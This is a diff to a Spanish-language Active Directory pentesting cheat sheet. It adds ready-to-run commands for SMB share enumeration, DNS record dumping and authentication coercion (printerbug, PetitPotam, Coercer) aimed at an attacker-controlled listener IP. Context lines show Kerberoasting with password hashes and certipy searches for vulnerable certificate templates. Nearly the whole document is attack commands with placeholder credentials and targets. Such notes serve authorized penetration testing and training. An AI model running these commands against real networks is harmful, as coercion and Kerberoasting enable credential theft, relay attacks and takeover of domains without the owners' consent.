@@ -1,10 +1,8 @@
 # Enumeracion de Active Directory
 
-Inspired by:
+Inspired by [Orange Cyberdefense](https://orange-cyberdefense.github.io/ocd-mindmaps/):
 
 ![Mindmap Pentest AD](image-1.png)
-
-
 
 ## Reconocimiento
 
@@ -128,4 +126,35 @@ GetUserSPNs.py -request -dc-ip <DCIP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNA
 certipy find -u user@domain.com -p 'pass' -vulnerable -dc-ip DCIP -stdout > certipy_output.txt
 ```
 
+### Enum shares
 
+```bash
+crackmapexec smb smb.txt -u 'user' -p 'pass' --shares
+```
+
+### Enum dns
+
+[dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
+[adidnsdump](https://github.com/dirkjanm/adidnsdump)
+```bash
+python3 dnstool.py -u 'domain.com\username' -p 'password' --record '*' --action query DCIP
+adidnsdump -u 'domain.com\username' -p 'password' pc.domain.com
+```
+
+### Coerce
+
+> Iniciar listener antes 
+
+[Coercer.py](https://github.com/p0dalirius/Coercer)
+[PetitPotam.py](https://github.com/topotam/PetitPotam)
+[printerbug.py](https://github.com/dirkjanm/krbrelayx/)
+
+```bash
+python3 rpcdump.py domain.com/username:Password@target | grep MS-RPRN
+#Protocol: [MS-RPRN]: Print System Remote Protocol 
+python3 printerbug.py domain.com/username:'Password'@targetIP listenerIP
+#Authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
+python3 PetitPotam.py -u 'username' -p 'password' -d 'domain.com' listenerIP targetIP
+#Automatically coerce a Windows server to authenticate on an arbitrary machine through many methods
+python3 Coercer.py coerce -u 'username' -p 'password' -d 'domain.com' -t targetIP -l listenerIP --always-continue
+```
